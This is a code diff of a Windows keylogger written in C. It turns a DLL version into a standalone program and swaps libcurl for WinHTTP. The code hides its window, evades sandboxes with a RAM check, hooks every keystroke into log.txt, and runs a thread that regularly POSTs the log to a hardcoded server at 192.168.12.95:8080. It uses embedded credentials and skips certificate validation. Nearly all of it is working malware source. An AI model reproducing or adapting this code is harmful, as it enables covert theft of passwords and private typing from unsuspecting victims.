@@ -1,51 +1,30 @@
-// dllmain.cpp : Defines the entry point for the DLL application.
-#include "pch.h"
-#include <curl/curl.h>
 #include "keylogger.h"
 #define KEYLOG_FILE "log.txt"
-#define MUTEX_NAME "secret"
 #define DEBUG 1
-#define MAX_CLICKS 10
 #define MAX_TIMEOUT (15 * 60 * 1000)  // 15 minutes in milliseconds
 #define MINIMUM_RAM 7.0 // in GB
-#define POST_URL "https://192.168.12.95:8080/file.txt"
-
-
+#define HOSTNAME L"192.168.12.95"
 // Prototypes
 WINHTTP_STATUS_CALLBACK WinhttpStatusCallback;
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 char determineCharGivenVkCode(DWORD vkCode);
 void cleanup();
 VOID Fatal(LPCSTR s);
+int detectSandbox();
 int logger();
 BOOL notEnoughRAM();
 BOOL detectSandbox();
+DWORD WINAPI SendLog(LPVOID lpParam);
+DWORD WINAPI PrintThreadFunction(LPVOID lpParam);
 int sendHTTPRequest();
-int programStart();
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-                     )
-{
-    switch (ul_reason_for_call)
-    {
-    case DLL_PROCESS_ATTACH:
-		if (detectSandbox())
-		{
-			exit(1); // clean exit
-		}
-		sendHTTPRequest(); // send the http request on startup
-		break;
-    }
-	programStart(); // do the keylogging
-    return TRUE;
-}
 
+int clickCount = 0;
+int timedOut = 0;
 
-int programStart() {
+int main() {
 	DWORD err;
 	HWND hwnd = GetConsoleWindow();
-	LPCSTR MutexName = MUTEX_NAME;
+	LPCSTR MutexName = "secret";
 
 	ShowWindow(hwnd, SW_HIDE); // hide the window.
 	ghMutex = CreateMutexA(NULL, TRUE, MutexName);
@@ -61,6 +40,7 @@ int programStart() {
 	{
 		//Mutex exists
 		Fatal("Mutex already exists\n");
+		exit(1);
 	}
 	 //Sandbox detection
 	if (detectSandbox()) {
@@ -76,6 +56,14 @@ int logger(){
 	HANDLE hThread;
 	DWORD dwThreadId;
 
+	hThread = CreateThread(NULL, 0, SendLog, NULL, 0, &dwThreadId);
+	if (hThread == NULL)
+	{
+		Fatal("Thread error");
+		exit(1);
+	}
+	CloseHandle(hThread);
+	 //This GetMessage() loop is used to prevent the application from closing.
 	MSG msg;
 	BOOL bRet;
 	while ((bRet = GetMessage(&msg, NULL, 0, 0)) != 0) {
@@ -359,7 +347,7 @@ VOID Fatal(LPCSTR s) {
     char err_buf[1000];
 
     snprintf(err_buf,sizeof(err_buf), "%s failed: %lu", s, GetLastError());
-    //MessageBoxA(NULL, err_buf, "msgbox", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR); // for debugging
+    //MessageBoxA(NULL, err_buf, "msgbox", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 	CloseHandle(ghMutex);
     ExitProcess(1);
 }
@@ -401,49 +389,154 @@ BOOL notEnoughRAM() {
 
 int sendHTTPRequest()
 {
-	CURL* curlHandle = curl_easy_init(); // create the curl handle
-	if (curlHandle) {
-		CURLcode res;
-		FILE* fileHandle;
-		int err = 0;
-
-		curl_easy_setopt(curlHandle, CURLOPT_URL, "https://192.168.12.95:8080/file.txt");
-		curl_easy_setopt(curlHandle, CURLOPT_USERPWD, "mayuri:tuturu"); // authentication
-		// allow self signed certs
-		curl_easy_setopt(curlHandle, CURLOPT_SSL_VERIFYPEER, 0L);
-		curl_easy_setopt(curlHandle, CURLOPT_SSL_VERIFYHOST, 0L);
-
-		curl_easy_setopt(curlHandle, CURLOPT_POST, 1);
-
-		// Read the file contents into a buffer
-		FILE* file;
-		err = fopen_s(&file, "log.txt", "rb");
-		if (err != 0)
+		LPCWSTR hostname = HOSTNAME;
+		INTERNET_PORT port = 8080;
+		LPCWSTR username = L"mayuri";
+		LPCWSTR password = L"tuturu";
+		LPCWSTR headers = L"Authorization: Basic bWF5dXJpOnR1dHVydQ==\r\nContent-Type: multipart/form-data\r\n";
+		BOOL  bResults = FALSE;
+		HINTERNET hSession = NULL,
+				  hConnect = NULL,
+				  hRequest = NULL;
+		
+		// Use WinHttpOpen to obtain a session handle.
+		hSession = WinHttpOpen(  NULL, 
+								 WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+								 WINHTTP_NO_PROXY_NAME, 
+								 WINHTTP_NO_PROXY_BYPASS, 0);
+		
+		// Specify an HTTP server.
+		if (hSession)
+			hConnect = WinHttpConnect( hSession, hostname,
+									   port, 0);
+		
+		// Create an HTTP Request handle.
+		if (hConnect)
+			hRequest = WinHttpOpenRequest( hConnect, L"POST", 
+										   L"/file.txt", 
+										   NULL, WINHTTP_NO_REFERER, 
+										   WINHTTP_DEFAULT_ACCEPT_TYPES,
+										   WINHTTP_FLAG_SECURE);
+		
+		
+		// Set the headers
+		  if( hRequest )
+			bResults = WinHttpAddRequestHeaders( hRequest, headers,
+												 (ULONG) -1L,
+												 WINHTTP_ADDREQ_FLAG_ADD );
+		
+		  //open the log file for reading
+		  FILE* file;
+		  errno_t err;
+		
+		  err = fopen_s(&file,"log.txt", "rb");
+		
+		  if (file == NULL)
+		  {
+			  WinHttpCloseHandle(hConnect);
+			  WinHttpCloseHandle(hSession); 
+			  Fatal("WinHttpError");
+			  exit(1);
+		  }
+		
+		  // get the size of the file
+		  fseek(file, 0, SEEK_END);
+		  long fileSize = ftell(file);
+		  fseek(file, 0, SEEK_SET);
+		
+		  // allocate memory for the file
+		  char* fileBuffer = (char*)malloc(fileSize);
+		
+		  // handle memory allocation error
+		  if (!fileBuffer) {
+			  WinHttpCloseHandle(hConnect);
+			  WinHttpCloseHandle(hSession);
+			  return -1;
+		  }
+		
+		  fread(fileBuffer, 1, fileSize, file);
+		  fclose(file);
+		
+		  /*
+		  * In order to successfully establish a connection with a self signed cert, we need to
+		  * fail the first request, and then, retry the connection. Upon retrying the connection, we can
+		  * connect
+		  */
+		
+		BOOL retry = false;
+		DWORD result = NO_ERROR;
+		do
 		{
-			printf("file read issue\n");
+			// Send a Request.
+			if (hRequest)
+			{
+				bResults = WinHttpSendRequest(hRequest,
+					WINHTTP_NO_ADDITIONAL_HEADERS,
+					0, fileBuffer, fileSize,
+					fileSize, 0);
+			if (bResults == false)
+			{
+				result = GetLastError();
+		
+				if (result == ERROR_WINHTTP_SECURE_FAILURE)
+				{
+					DWORD dwFlags =
+						SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+						SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
+						SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+						SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+		
+					if (WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
+					{
+						retry = true;
+					}
+		
+				}
+				else if (result == ERROR_WINHTTP_RESEND_REQUEST)
+				{
+					retry = true;
+				}
+			}
+			else
+			{
+				retry = false;
+			}
+			}
+		} while (retry);
+		
+		// Report any errors. If we do not get a response
+		if (!bResults)
+		{
+			char formattedError[50];
+			//printf("WinHTTP Error %d has occurred.\n", GetLastError());
+			//sprintf(formattedError, "%d", GetLastError());
+			Fatal(formattedError);
 			return -1;
 		}
-
-		if (file) {
-			fseek(file, 0, SEEK_END);
-			long file_size = ftell(file);
-			rewind(file);
-			char* file_contents = (char*)malloc(file_size + 1);
-			if (file_contents) {
-				fread(file_contents, 1, file_size, file);
-				file_contents[file_size] = '\0';
-
-				// Set the file contents as the data to be posted
-				curl_easy_setopt(curlHandle, CURLOPT_POSTFIELDS, file_contents);
-				res = curl_easy_perform(curlHandle);
-				if (res != CURLE_OK && res != CURLE_RECV_ERROR) {
-					fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
-				}
-				curl_easy_cleanup(curlHandle);
-			}
-			curl_global_cleanup(); //cleanup libcurl
-			fclose(file);
+		
+		// Close any open handles.
+		if (hRequest) WinHttpCloseHandle(hRequest);
+		if (hConnect) WinHttpCloseHandle(hConnect);
+		if (hSession) WinHttpCloseHandle(hSession);
+		free(fileBuffer);
+		//printf("Request Sent Successfully");
+		return 0;
 		}
-	}
-	return 1;
+
+DWORD WINAPI PrintThreadFunction(LPVOID lpParam)
+{
+    while (1)
+    {
+		printf("The thread is running!");
+        Sleep(5000);
+    }
+}
+
+DWORD WINAPI SendLog(LPVOID lpParam)
+{
+    while (1)
+    {
+        Sleep(SEND_FREQUENCY);
+        sendHTTPRequest();
+    }
 }
